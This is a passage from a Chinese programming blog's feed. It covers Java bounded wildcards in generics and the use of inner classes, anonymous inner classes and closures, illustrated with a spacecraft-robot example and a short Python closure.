&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是，根据面向对象的思想，子类对象又是能够放进父类对象的集合里的。如果你不适用参数化类型(类型推导)，这么做也完全可以。
那么，是否能够在使用参数化类型的同时又能够将子类对象放入父类对象的集合呢？
这就是有限制通配符的用法。&lt;/p>
&lt;h3 id="-extends-e">? extends E&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 将集合中所有的元素全部压栈
&lt;/span>&lt;span style="color:#75715e"> * 通过使用有限制的通配符类型来提升api的灵活性。集合对象的元素必须是E的子类。
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param iterable 集合对象
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pushAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Iterable&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> E&lt;span style="color:#f92672">&amp;gt;&lt;/span> iterable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>E e &lt;span style="color:#f92672">:&lt;/span> iterable&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
list&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">addLast&lt;/span>&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="-super-e">? super E&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 将所有元素弹栈,并追加到参数集合中.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param collection 集合对象,必须是泛型参数的父类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">popAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Collection&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#66d9ef">super&lt;/span> E&lt;span style="color:#f92672">&amp;gt;&lt;/span> collection&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>isEmpty&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
collection&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>pop&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 泛型方法测试函数。
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param args
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String args&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
GenericApplication&lt;span style="color:#f92672">&amp;lt;&lt;/span>Number&lt;span style="color:#f92672">&amp;gt;&lt;/span> ga &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> GenericApplication&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 有限制的通配符测试 ? extends E
&lt;/span>&lt;span style="color:#75715e">&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> listInteger &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
ga&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">pushAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>listInteger&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">//ga.pushAllFromEs(listInteger);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">// 有限制的通配符测试 ? super E
&lt;/span>&lt;span style="color:#75715e">&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> objects &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
ga&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">popAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>objects&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">//ga.popAllIntoEs(objects);
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>使用基于类型推导的泛型类，泛型方法以使代码变得更加健壮。&lt;/li>
&lt;li>避免使用源生类型，对于未知类型的集合请使用通配符，以加强代码的约束性。&lt;/li>
&lt;li>合理使用有限制的通配符，提升你的 API 灵活性。&lt;/li>
&lt;/ol></description></item><item><title>正确使用内部类</title><link>https://www.chucklin.net/post/innerclass/</link><pubDate>Mon, 13 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/innerclass/</guid><description>&lt;p>Java 的内部类种类较多，语法比较复杂，用法也不尽相同。
由于篇幅所限，本篇文章只对实际项目开发中用的较多的普通内部类与匿名内部类做一定介绍。&lt;/p>
&lt;p>内部类概括下来，可以分类为以下五种内部类。&lt;/p>
&lt;ul>
&lt;li>内部类&lt;/li>
&lt;li>嵌套内部类&lt;/li>
&lt;li>局部内部类&lt;/li>
&lt;li>接口内部类&lt;/li>
&lt;li>匿名内部类&lt;/li>
&lt;/ul>
&lt;h2 id="内部类的语法结构">内部类的语法结构&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">import&lt;/span> java.util.HashMap&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Parcell&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;&lt;/span> testMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;();&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Contents&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 返回一个外部类的引用.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> Parcell ParcellRef &lt;span style="color:#f92672">=&lt;/span> Parcell&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">this&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Destination&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">putSomethingInMap&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
testMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>testMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Destination &lt;span style="color:#a6e22e">to&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Destination&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Contents &lt;span style="color:#a6e22e">contents&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Contents&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">ship&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String dest&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Contents c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Contents&lt;span style="color:#f92672">();&lt;/span>
Destination d &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Destination&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Parcell p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Parcell&lt;span style="color:#f92672">();&lt;/span>
Parcell&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Contents&lt;/span> c &lt;span style="color:#f92672">=&lt;/span> p&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">contents&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Parcell&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Destination&lt;/span> d &lt;span style="color:#f92672">=&lt;/span> p&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">to&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
d&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">putSomethingInMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Parcell&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Contents&lt;/span> c1 &lt;span style="color:#f92672">=&lt;/span> p&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">new&lt;/span> &lt;span style="color:#a6e22e">Contents&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>简要概括一下内部类的语法特点：&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>普通内部类持有一个指向外部类的引用。要创建普通内部类，一定要先创建外部类。&lt;/li>
&lt;li>普通内部类就像人体的心脏一样，能够随意访问外部类的任意成员变量。&lt;/li>
&lt;li>在内部类中可以通过“外部类类名.this”的方式返回一个指向外部类实例的引用.如 Parcell.this&lt;/li>
&lt;li>在外部类的 static 方法中若要创建内部类对象，则需要通过“外部类类名.new XXX()”的方式来创建。&lt;/li>
&lt;li>普通内部类中不能拥有静态成员变量。静态内部类中可以拥有静态成员变量。也可以拥有非静态成员变量。但是静态内部类不能访问外部类中非静态的成员变量。而普通内部类可以访问外部类的静态成员变量。&lt;/li>
&lt;/ol>
&lt;h2 id="什么时候应该使用内部类">什么时候应该使用内部类&lt;/h2>
&lt;dl>
&lt;dt>回归主题，内部类到底有什么用？归根结底，主要就是一点：&lt;/dt>
&lt;dd>“内部类，主要是设计出来用来解决 java 中所‘缺少’的，多重继承的概念的。”&lt;/dd>
&lt;/dl>
&lt;p>等等，Java 不是靠接口来实现多重继承的吗？我认为，这种说法对，也不对。下面我们来看这样一个例子。
你正在参与一项代号 X 的星际飞船项目。&lt;/p>
&lt;p>宇航局的人希望飞船上的综合机器人能够完成两个工作。一是作为向导，能够供人们查阅信息。二是作为修理机器人，完成一些简单的飞船日常维护工作。
作为软件工程师，你被要求编写一段代码来实现这两个功能。&lt;/p>
&lt;p>好消息是，向导部分的功能与飞船修理维护的功能，已经由你的同事们完成了！太好了，我只需要调用他们提供给我们的接口就大功告成了！坏消息是，同事们编写的向导功能与飞船修理功能的接口，竟然都叫做 work!
这可伤脑筋了，应该怎么办呢？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Guider&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">work&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;欢迎光临&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;,请查阅飞船信息&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">-------------------------------------------------------------------&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Repairer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">work&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;你好&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;,开始准备对飞船进行维护.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">-------------------------------------------------------------------&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SpacecraftRobot&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Guider &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doGuidWork&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 调用guider的work方法
&lt;/span>&lt;span style="color:#75715e">&lt;/span> work&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 返回内部类引用，调用内部类实例的work方法。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> repairerRobot&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">repairerRobot&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Repairer &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
work&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>太棒了。通过使用内部类与“多重继承”，我们实现了这个功能。现在这个综合机器人能够正常工作了！对于用户来说，只需要走到机器人面前，告诉机器人你想要 doGuidWork 还是 doRepairWork，它就能够帮你干活儿了。内部类的代码对用户，对外界彻底隐藏了起来，用户唯一能够获得的信息就是这两个方法而已。&lt;/p>
&lt;h3 id="关于匿名内部类">关于匿名内部类&lt;/h3>
&lt;p>综合机器人原型机试做成功后，新的工作来了！
我们需要对原型机进行量产。以满足每艘星际飞船的需要。
现在我们要编写一间生产综合机器人的工厂。每当我们访问一次工厂，就能够从工厂中提取出一台崭新的综合机器人。聪明的你想到了用工厂设计模式来解决这个问题！但是由于有了内部类，所以我们的工厂，稍稍显得有点不同&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">// 机器人工厂接口。通过getSpaceCraftRobot方法对外提供机器人
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">SpaceCraftRobotFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
SpacecraftRobot &lt;span style="color:#a6e22e">getSpaceCraftRobot&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">-------------------------------------------------------------------&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">ProduceSpaceCraftRobot&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 再也不用显示的创建工厂类的对象了！
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">ProduceSpaceCraftRobot&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 通过匿名内部类，创建工厂对象！将工厂封装到了内部。不对外界暴露
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SpaceCraftRobotFactory produceRobot &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SpaceCraftRobotFactory &lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> SpacecraftRobot &lt;span style="color:#a6e22e">getSpaceCraftRobot&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SpacecraftRobot&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">};&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">-------------------------------------------------------------------&lt;/span>
&lt;span style="color:#75715e">// 客户
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Consumer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 客户来提取机器人了.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> SpacecraftRobot x1 &lt;span style="color:#f92672">=&lt;/span> ProduceSpaceCraftRobot&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">produceRobot&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getSpaceCraftRobot&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
x1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doGuidWork&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;lch&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
x1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doRepairWork&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;lch&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过创建匿名内部类，我们使传统的工厂设计模式优雅了许多！再也不用在外部编写 new xxxFactory()这样丑陋，多余的代码了。
现在的工厂被匿名内部类隐藏了起来。客户只需要关心有没有拿到称心如意的机器人。不应该，不需要关心工厂的名字，也不需要知道工厂是干嘛的。恭喜，你顺利完成了宇航局交给你的任务。&lt;/p>
&lt;h2 id="内部类与闭包的关系">内部类与闭包的关系&lt;/h2>
&lt;p>作为一个程序员，即使你从来没有使用过，你也应该听说过闭包与回调。
使用 Java 来讲解闭包与回调会比较困难。所以我们用 python 语言作为示例，来了解闭包与回调到底是什么。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#定义一个返回sum函数的名叫base_sum函数的函数&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">base_sum&lt;/span>(a,b):
&lt;span style="color:#75715e">#在base_sum中定义一个sum()函数用来计算base_sum(a,b)的形参之合&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">sum&lt;/span>():
&lt;span style="color:#75715e">#返回a+b的值&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> a &lt;span style="color:#f92672">+&lt;/span> b
&lt;span style="color:#75715e">#返回定义的sum函数&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> sum
&lt;span style="color:#75715e">#调用base_sum返回函数sum()，可以理解为返回了一个函数指针&lt;/span>
return_method &lt;span style="color:#f92672">=&lt;/span> base_sum(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>)
&lt;span style="color:#75715e">#打印出返回的函数对象&lt;/span>
print(return_method)
&lt;span style="color:#75715e">#通过指针回调函数对象，返回a与b的合&lt;/span>
print(return_method())
&lt;span style="color:#f92672">----------&lt;/span>
&lt;span style="color:#f92672">&amp;lt;&lt;/span>function base_sum&lt;span style="color:#f92672">.&amp;lt;&lt;/span>locals&lt;span style="color:#f92672">&amp;gt;.&lt;/span>sum at &lt;span style="color:#ae81ff">0x1018f3c80&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#ae81ff">3&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于 java 程序员来说，在一个函数中定义另外一个函数也许会比较烧脑。你可以试着这样去理解他：&lt;/p>
&lt;p>&lt;strong>首先你需要了解的是，函数也需要占据内存空间，所以函数在内存中也是有地址的。在 c 语言中，函数名就代表这个函数的地址。
如果你有过 c 语言的编程经验，你就应该知道在一个函数中，返回一个指针是一件很容易的事情。
所以，对于以上这段 python 代码，你可以尝试把它理解为：
base_sum()函数中定义了一个指向 sum()函数的指针，并且这个指针作为 base_sum()的返回值。&lt;/strong>&lt;/p>
&lt;dl>
&lt;dt>好了，现在我们根据上面的例子，来“定义一下闭包”。&lt;/dt>
&lt;dd>调用外部函数，返回一个持有外部函数变量，参数引用的内部函数对象的程序结构，我们就称它为“闭包”。&lt;/dd>
&lt;/dl>
&lt;p>遗憾的是，java 中没有为我们显示的提供指针供我们操作，也没有提供类似 python，javascrpit 中的函数定义的语法，那么我们应该如何实现闭包呢？
不妨还是通过综合机器人来解答这个疑问吧。这一次，让我们稍稍修改一下综合机器人的代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SpacecraftRobot&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Guider &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 外部类的成员变量
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> String name&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">SpacecraftRobot&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">repairerRobot&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Repairer &lt;span style="color:#f92672">{&lt;/span>
